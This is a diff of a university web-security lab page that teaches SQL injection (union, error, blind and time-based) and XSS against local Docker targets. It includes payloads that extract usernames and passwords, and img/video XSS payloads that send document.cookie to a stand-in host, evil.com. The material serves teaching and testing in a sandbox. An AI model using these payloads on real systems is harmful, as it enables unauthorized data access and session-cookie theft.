@@ -1,22 +1,22 @@
-# Lab 6: Web Security
+# Lab 5: Web Security
 
 {% hint style="danger" %}
 READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.
 {% endhint %}
 
-## 6. Introduction
+## 5. Introduction
 
 SQL injection (SQLi) and Cross-Site Scripting (XSS) are a type of **injection (AS03:2021)** vulnerabilities that have been listed as one of the top 10 web application security risks by OWASP ([OWASP Top 10](https://owasp.org/www-project-top-ten/)). This lab will explore these two types of vulnerabilities on vulnerable web applications and explain how to detect these vulnerabilities via source code review and black box testing.
 
 You will need to use your Kali VM, and we will be using docker to run SQL and XSS servers.
 
-## 6.1 SQLi
+## 5.1 SQLi
 
 In this lab, we will expand on the materials covered in the lectures and provide you with more exercises in various SQLi types.
 
-### 6.1.1 Union-based SQLi Attacks
+### 5.1.1 Union-based SQLi Attacks
 
-#### **6.1.1.1 Detecting an SQLi attack vector**
+#### **5.1.1.1 Detecting an SQLi attack vector**
 
 The easiest way to see if some input is not properly santised for a SQL query is by sending a single `'` or `"` character. If the website crashes (sends a 500 HTTP status code) then it is a strong indication that the malicious input has caused a SQL syntax error, which caused the website to crash.
 
@@ -44,7 +44,7 @@ _The malformed query_
 SELECT name, description, amount, price FROM items WHERE name LIKE 'milk crate' AND '1'='1'
 ```
 
-#### **6.1.1.2 Methodology for exploiting Union-based SQLi**
+#### **5.1.1.2 Methodology for exploiting Union-based SQLi**
 
 **Step 1: Finding the number of columns your payload needs to return**
 
@@ -101,11 +101,11 @@ eg.
 ' UNION SELECT username,password,3,4 FROM users--
 ```
 
-### 6.1.2 Union-based SQLi Exercise
+### 5.1.2 Union-based SQLi Exercise
 
 We will be using `docker compose` for running the servers during this lab. If you do not have `docker compose` installed follow [Docker's documentation](https://docs.docker.com/compose/install/).
 
-To start this exercise, download [docker-compose.sqli\_union.yml](files/lab6/docker-compose-files/docker-compose.sqli\_union.yml).&#x20;
+To start this exercise, download [docker-compose.sqli\_union.yml](files/lab6/docker-compose-files/docker-compose.sqli\_union.yml).
 
 ```
 wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/lab6/docker-compose-files/docker-compose.sqli_union.yml
@@ -113,14 +113,12 @@ wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/lab6/do
 
 {% hint style="info" %}
 M1/M2 users: you have to make three changes:\
-1\. Line 6 - change the image name to `uwacyber/cits3006:sqli-union-arm64`&#x20;
+1\. Line 6 - change the image name to `uwacyber/cits3006:sqli-union-arm64`
 
 2\. Line 16 - change the image name to `arm64v8/mysql:8.0.30`
 
 3\. Line 18 - change the platform to `linux/arm64`
 {% endhint %}
-
-
 
 You can start the servers using one of the following commands that will automatically pull the images and start the containers.
 
@@ -140,7 +138,7 @@ To complete this exercise, you need to exploit the SQLi union-based vulnerabilit
 **Using `sqlmap` is not allowed!**
 {% endhint %}
 
-### 6.1.3 Error-based SQLi Attacks
+### 5.1.3 Error-based SQLi Attacks
 
 The only issue with Union-based SQLi is that it relies on the results of the SQL query being shown to the end-user on the website to work. In a number of circumstances, the results of a vulnerable SQL query are never displayed on the website and are only used by the backend web application.
 
@@ -152,7 +150,7 @@ For MySQL servers, the **`updatexml`** is a useful function for causing an SQL e
 ' AND updatexml(null,concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT 1,1)),null)--
 ```
 
-### 6.1.4 Error-based SQLi Exercise
+### 5.1.4 Error-based SQLi Exercise
 
 For this exercise, download [docker-compose.sqli\_error.yml](files/lab6/docker-compose-files/docker-compose.sqli\_error.yml).
 
@@ -162,7 +160,7 @@ wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/lab6/do
 
 {% hint style="info" %}
 M1/M2 users: you have to make three changes:\
-1\. Line 6 - change the image name to `uwacyber/cits3006:sqli-error-arm64`&#x20;
+1\. Line 6 - change the image name to `uwacyber/cits3006:sqli-error-arm64`
 
 2\. Line 16 - change the image name to `arm64v8/mysql:8.0.30`
 
@@ -181,7 +179,7 @@ To complete this exercise, find the flag stored on the database in the error mes
 **Using `sqlmap` is not allowed!**
 {% endhint %}
 
-### 6.1.5 Blind-based SQLi Attacks
+### 5.1.5 Blind-based SQLi Attacks
 
 There are a number of scenarios where a vulnerable SQL query is executed on the backend web application and the results/errors are never directly displayed to the end user. However, if the content on the page changes depending on the results of the vulnerable SQL query then an attacker can still exfiltrate data from the SQL server.
 
@@ -236,9 +234,9 @@ milk crate' AND substring((SELECT password FROM users WHERE username='admin' LIM
 
 There is one issue with this approach. For MySQL, string searches for non-binary strings (`CHAR`, `VARCHAR` and `TEXT`) using the collation of the comparison operands and are **case insensitive**! However, binary strings (`BINARY`, `VARBINARY` and `BLOB`) compare the numeric values of the bytes and the comparison is **case sensitive**. The following exercise would be constructing a Blind-based SQLi payload that is **case sensitive**.
 
-### 6.1.6 Blind-based SQLi Exercise
+### 5.1.6 Blind-based SQLi Exercise
 
-For this exercise, download [docker-compose.sqli\_blind.yml](files/lab6/docker-compose-files/docker-compose.sqli\_blind.yml).&#x20;
+For this exercise, download [docker-compose.sqli\_blind.yml](files/lab6/docker-compose-files/docker-compose.sqli\_blind.yml).
 
 ```
 wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/lab6/docker-compose-files/docker-compose.sqli_blind.yml
@@ -246,7 +244,7 @@ wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/lab6/do
 
 {% hint style="info" %}
 M1/M2 users: you have to make three changes:\
-1\. Line 6 - change the image name to `uwacyber/cits3006:sqli-blind-arm64`&#x20;
+1\. Line 6 - change the image name to `uwacyber/cits3006:sqli-blind-arm64`
 
 2\. Line 16 - change the image name to `arm64v8/mysql:8.0.30`
 
@@ -270,7 +268,7 @@ You should be able to demonstrate the following tasks if asked:
 **The flag has to match the correct case! So be careful how you construct your SQLi payload.**
 {% endhint %}
 
-### 6.1.7 Time-based SQLi Attacks
+### 5.1.7 Time-based SQLi Attacks
 
 If the vulnerable SQL query does not show any results or alter the response, then a time-based SQLi attack is required. Time-based is similar to Blind-based SQLi, but instead of altering the response, you cause the web application to **sleep** when you find the correct value and delay the response from the website.
 
@@ -280,7 +278,7 @@ In SQL you can write an **if** statement using the MySQL function `IF`. The belo
 ' AND IF(substring((SELECT password FROM users WHERE username='admin' LIMIT BY 1), 2, 1)='a', SLEEP(3), 0)--
 ```
 
-### 6.1.8 Time-based SQLi Exercise
+### 5.1.8 Time-based SQLi Exercise
 
 For this exercise, download [docker-compose.sqli\_time.yml](files/lab6/docker-compose-files/docker-compose.sqli\_time.yml).
 
@@ -290,7 +288,7 @@ wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/lab6/do
 
 {% hint style="info" %}
 M1/M2 users: you have to make three changes:\
-1\. Line 6 - change the image name to `uwacyber/cits3006:sqli-time-arm64`&#x20;
+1\. Line 6 - change the image name to `uwacyber/cits3006:sqli-time-arm64`
 
 2\. Line 16 - change the image name to `arm64v8/mysql:8.0.30`
 
@@ -314,11 +312,11 @@ You should be able to demonstrate the following tasks:
 **The flag has to match the correct case! So be careful how you construct your SQLi payload.**
 {% endhint %}
 
-## 6.2 XSS Attacks
+## 5.2 XSS Attacks
 
 XSS attacks exploit an HTML injection vulnerability that executes malicious javascript that can access a victim's cookies, session tokens or other sensitive information from a trusted source. In this lab, we will explore exploiting client-side XSS vulnerabilities.
 
-### 6.2.1 Exploiting a Basic XSS Vulnerability
+### 5.2.1 Exploiting a Basic XSS Vulnerability
 
 The simplest attack vector for an XSS attack is to see if `<script>alert(123)</script>` causes an alert to be displayed. If it does then the page is not filtering the `<` and `>` or `<script>`, enabling malicious javascript to be executed.
 
@@ -347,9 +345,9 @@ However, if the session cookies have `HttpOnly` attribute set to `true` you can 
 </script>
 ```
 
-### 6.2.2 Basic XSS Attack Exercise
+### 5.2.2 Basic XSS Attack Exercise
 
-For this exercise, download [docker-compose.xss\_basic.yml](files/lab6/docker-compose-files/docker-compose.xss\_basic.yml).&#x20;
+For this exercise, download [docker-compose.xss\_basic.yml](files/lab6/docker-compose-files/docker-compose.xss\_basic.yml).
 
 {% hint style="warning" %}
 The bot (xss-bot service) is used to insert the flag as the document cookie via the chrome browser driver. So you are required to use the Chrome browser for this exercise.
@@ -368,8 +366,8 @@ wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/lab6/do
 {% hint style="info" %}
 M1/M2 users: you have to do the following 5 tasks:
 
-1\. Run the amd64 emulator - \
-`sudo docker run --privileged --rm tonistiigi/binfmt --install amd64` \
+1\. Run the amd64 emulator -\
+`sudo docker run --privileged --rm tonistiigi/binfmt --install amd64`\
 2\. Line 6 - change the image name to `uwacyber/cits3006:xss-server-no-csp-arm`
 
 3\. Line 29 - change the image name to `arm64v8/mysql:8.0.30`
@@ -381,7 +379,8 @@ M1/M2 users: you have to do the following 5 tasks:
 
 Run the Docker containers using the following command.
 
-<pre><code><strong>sudo docker-compose -f docker-compose.xss_basic.yml up</strong></code></pre>
+<pre><code><strong>sudo docker-compose -f docker-compose.xss_basic.yml up
+</strong></code></pre>
 
 Next, we will be running a basic HTTP server for receiving the exfiltrated cookie for the admin user. You can do this using the following command that will start the `python` HTTP server.
 
@@ -391,7 +390,7 @@ python3 -m http.server 80
 
 Now, perform XSS to steal the server's document cookies.
 
-### 6.2.3 Exploiting XSS Using Other HTML Tags
+### 5.2.3 Exploiting XSS Using Other HTML Tags
 
 Sometimes a web application will have a filter implemented that removes `<script>` from the user input or the Content-Security-Policy has disabled inline execution of JavaScript code (discussed more in section 6.2.3). However, this filter is not sufficient to prevent an XSS attack since there are large number of other HTML tags that can also execute JavaScript. For example, the `<img>` tag has an `onerror` attribute that executes JavaScript code if an error occurs trying to load the image. So you can still trigger the XSS vulnerability with the following payload.
 
@@ -408,9 +407,9 @@ Below are a list of other XSS payloads using other HTML tags beside `<script>` a
 <video src=_ onloadstart="window.location='https://evil.com/?nomnom='+document.cookie" />
 ```
 
-### 6.2.4 XSS Using Other HTML Tags Exercise
+### 5.2.4 XSS Using Other HTML Tags Exercise
 
-For this execise, download [docker-compose.xss\_alt\_tag.yml](files/lab6/docker-compose-files/docker-compose.xss\_alt\_tag.yml).&#x20;
+For this execise, download [docker-compose.xss\_alt\_tag.yml](files/lab6/docker-compose-files/docker-compose.xss\_alt\_tag.yml).
 
 ```
 wget https://github.com/uwacyber/cits3006/raw/2023S2/cits3006-labs/files/lab6/docker-compose-files/docker-compose.xss_alt_tag.yml
@@ -422,11 +421,12 @@ M1/M2 users: make the same changes as you did in Section 6.2.2.
 
 Run the Docker containers using the following command.
 
-<pre><code><strong>sudo docker-compose -f docker-compose.xss_alt_tag.yml up</strong></code></pre>
+<pre><code><strong>sudo docker-compose -f docker-compose.xss_alt_tag.yml up
+</strong></code></pre>
 
-Now perform XSS  without the `<script>` HTML tag.
+Now perform XSS without the `<script>` HTML tag.
 
-### 6.2.3 Bypassing Content Security Policy Protections
+### 5.2.3 Bypassing Content Security Policy Protections
 
 The Content-Security-Policy (CSP) is a response header sent by web applications to browsers that define trusted sources for web content and is a recommended mitigation strategy against XSS attacks. The web browser will read the Content-Security-Policy and rejects rendering any components that do not comply with the policy. An example of a CSP configuration that will only allow rendering content hosted on the website is shown below.
 
@@ -449,7 +449,7 @@ However, an attacker can bypass the above CSP since it does not specify exact Ja
 
 [HackTricks documents a large variety of methods for bypassing Content-Security-Policy headers using third-party endpoints.](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
 
-### 6.2.5 Bypassing CSP Exercise (Enthusiastics only)
+### 5.2.5 Bypassing CSP Exercise (Enthusiastics only)
 
 For this exercise, download [docker-compose.xss\_csp.yml](files/lab6/docker-compose-files/docker-compose.xss\_csp.yml).
 
@@ -479,12 +479,20 @@ You need to research a method to exploit the XSS vulnerability with this CSP. Be
 2. One of the allowed sources has a JSONP endpoint that you can use in your exploit.
 3. If you have the correct method but it is not working, **make sure you have a proper URL encoding in your payload**! For example, the `+` in a URL decodes to `.` (i.e., a full stop).
 
-## 6.3. Conclusion
+## 5.3. Conclusion
 
 In this lab, we explored ways to exploit web vulnerabilities, particularly SQLi and XSS, to gain unauthorized access to data and systems.
 
-This is the final lab in CITS3006. You can now focus on studying for your remaining assessment items (lab quiz 3 and also the project).
+Next up: Active Directory.
 
+{% hint style="info" %}
+Please preview the next lab setup guide, as you will need to set up a new VM - Windows Server 2019. The size of the ISO is about 5GB, so it is a good idea to download that beforehand and get started on its installation (took me half an hour to get it set up FYI).
+{% endhint %}
 
+{% hint style="warning" %}
+M1/M2 users: setting up the Windows Server 2019 is extremely slow due to emulation (\~2 hours), but it is a good learning exercise. So you should try doing this before coming to the lab.
+
+I also provide you a preconfigured Windows Server 2019 image for UTM that you can download (on Teams), but please note the image size is 10GB.
+{% endhint %}
 
 Credit: Thanks to Alex Brown for making this a fun lab!
